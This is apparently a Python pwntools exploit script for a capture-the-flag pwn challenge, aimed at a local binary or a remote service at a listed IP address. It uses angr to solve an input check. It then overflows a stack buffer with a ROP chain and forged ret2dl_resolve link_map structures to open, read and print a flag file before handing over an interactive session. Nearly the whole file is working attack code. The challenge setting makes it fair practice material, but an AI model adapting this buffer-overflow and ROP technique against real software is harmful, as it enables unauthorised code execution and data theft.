#!/usr/bin/env python
# coding: utf-8
from pwn import *

import angr
import base64
import random
import logging
import claripy

context.log_level = "debug"
local=True
name = "binary"

if local:
    p = process(argv=[name,'1234'])
else:
    p = remote("39.107.32.202", 2333)

def sd(cont):
	p.sendline(cont)
def cv(cont):
	return p.recvuntil(cont)
def attach():
	if local:
		gdb.attach(pidof(name)[0],gdbscript = "source debug")
def debug():
	if local:
		p.close()
		p = gdb.debug("./" + name,"source debug")
def wait():
	if local:
		raw_input()
	else:
		sleep(0.5)

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']


if local:
	off_onegadget = 0x4526A
	offset___libc_start_main_ret = 0x20830
	offset_system = 0x45390
	offset_read = 0x00000000000f7250
	offset_write = 0x00000000000f72b0
	offset_str_bin_sh = 0x18cd17
	offset_exit = 0x000000000003a030
	offset_open = 0x00000000000f7030
	offset___libc_start_main = 0x0000000000020740
	offset_puts = 0x000000000006f690
	offset_printf = 0x0000000000055800

else:
    offset___libc_start_main_ret = 0x20830
    offset_system = 0x0000000000045390
    offset_read = 0x00000000000f7220
    offset_write = 0x00000000000f7280
    offset_open = 0x00000000000f7000
    offset___libc_start_main = 0x0000000000020740


if not local:
	cv("------------------data info------------------")
	program = p.recvuntil("\nHi, input your luckynum to the pass the game:", drop=True)
	binary = base64.b64decode(program)
	name = "binary" + str(random.randint(1,100000))
	f = open(name,'wb')
	f.write(binary)
	f.close()

binary = ELF(name)



def ret2dl_resolve_linkmap_x64(ELF_obj,known_offset_addr,two_offset,linkmap_addr):
    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr
    linkmap=""
    linkmap+=p64(two_offset&(2**64-1))
    linkmap+=p64(0)+p64(linkmap_addr+0x18)
    linkmap+=p64((linkmap_addr+0x30-two_offset)&(2**64-1))+p64(0x7)+p64(0)
    linkmap+=p64(0) #overwrite with new number, why?
    linkmap+=p64(0)+p64(known_offset_addr-8)
    linkmap+='flag\x00\x00\x00\x00'#for system offset 0x48
    linkmap = linkmap.ljust(0x68,'A')
    linkmap+=p64(linkmap_addr)
    linkmap+=p64(linkmap_addr+0x38)
    linkmap = linkmap.ljust(0xf8,'A')
    linkmap+=p64(linkmap_addr+8)
    linkmap += p64(0x0000000000400DA2) #pop_r15_ret

    resolve_call = p64(plt0+6)+p64(linkmap_addr)+p64(0)
    return (linkmap,resolve_call)



def angr_solve():
    proj = angr.Project(name)
    state = proj.factory.blank_state(addr = 0x400BC5)
    arg1 = state.solver.BVS("NUM",8*8)
    state.regs.rdi = arg1
    state.regs.rbp = 0xfd800000
    state.regs.rsp = 0xfe800000
    simgr=proj.factory.simgr(state)
    sm = simgr.explore(find=0x0400926)
    found = sm.found[0]
    flag=found.se.eval(state.regs.rdi,cast_to=int)
    print "[*] FLAG:",str(flag)
    return flag

if not local:
    answer = angr_solve()
    p.sendline(line=str(answer))
    print "[*] Am I Right? Go on..."
    sleep(0.5)


bss_addr = 0x602200
libc_start_main_got = 0x602040
target_offset =  offset_open - offset___libc_start_main
gets_plt = 0x4007E0
alarm_got = 0x602038
atoi_got = 0x602058

pop_rdi_ret = 0x0000000000400da3
pop_rsi_r15_ret = 0x0000000000400da1
ropchain_start = 0x0000000000400D9A
ropchain_mid = 0x0000000000400D80
oret = 0x400DA4
pop_r15_ret = 0x0000000000400DA2
pop_r15_ret_ptr = bss_addr + 0x100

linkmap, resolve_call = ret2dl_resolve_linkmap_x64(binary, libc_start_main_got, target_offset, bss_addr)

pld = "a" *0x170 + p64(bss_addr) + p64(pop_rdi_ret) + p64(bss_addr - 0x100) + p64(gets_plt)

# open flag file=
pld += p64(ropchain_start) + p64(0) + p64(1) + p64(pop_r15_ret_ptr) + p64(0) + p64(2) + p64(bss_addr + 0x48) + p64(ropchain_mid)
pld += resolve_call

# read
target_offset = offset_read - offset___libc_start_main
linkmap2, resolve_call2 = ret2dl_resolve_linkmap_x64(binary, libc_start_main_got, target_offset, bss_addr)

pld += p64(pop_rdi_ret) + p64(bss_addr - 0x100) + p64(gets_plt)
pld += p64(ropchain_start) + p64(0) + p64(1) + p64(pop_r15_ret_ptr) + p64(0x60) + p64(0x602100) + p64(3) + p64(ropchain_mid)
pld += resolve_call2

# write
target_offset = offset_write - offset___libc_start_main
linkmap3, resolve_call3 = ret2dl_resolve_linkmap_x64(binary, libc_start_main_got, target_offset, bss_addr)
pld += p64(pop_rdi_ret) + p64(bss_addr) + p64(gets_plt)
pld += p64(ropchain_start) + p64(0) + p64(1) + p64(pop_r15_ret_ptr) + p64(0x60) + p64(0x602100) + p64(1) + p64(ropchain_mid)
pld += resolve_call3

p.sendline(pld)
sleep(1)
p.sendline('a' * 0x100 + linkmap)
sleep(1)
p.sendline('a' * 0x100 + linkmap2)
sleep(1)
p.sendline(linkmap3)

p.interactive()
